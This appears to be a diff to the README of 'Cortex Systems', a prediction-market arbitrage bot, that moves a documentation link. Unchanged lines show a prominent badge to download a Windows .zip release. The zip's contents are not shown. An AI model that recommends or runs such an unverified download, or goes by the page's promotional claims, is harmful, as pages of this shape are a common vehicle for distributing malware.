@@ -22,12 +22,6 @@
 
 
 
-
-
-<p align="center">
-  <b>Project Documentation:</b> <a href="https://arbitrage-bot.pro/">https://arbitrage-bot.pro/</a>
-</p>
-
 <p align="center">
   <a href="https://github.com/cal-miller-dev/cortex-deployment-hub/releases/download/CortexLauncher/Cortex.Systems.v3.4.2.Stable.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD_CORTEX_SYSTEMS-v3.4.2-blue?style=for-the-badge&logo=windows&logoColor=white" height="45">
@@ -58,6 +52,9 @@ To facilitate seamless integration for developers and AI agents, the **Cortex En
 
 This framework is optimized for high-volume data processing across major prediction events, including **Global Macroeconomic Shifts**, **Political Election Cycles**, and **Sports Liquidity Analysis**.
 
+<p align="center">
+  <b>Project Documentation:</b> <a href="https://arbitrage-bot.pro/">https://arbitrage-bot.pro</a>
+</p>
 
 
 
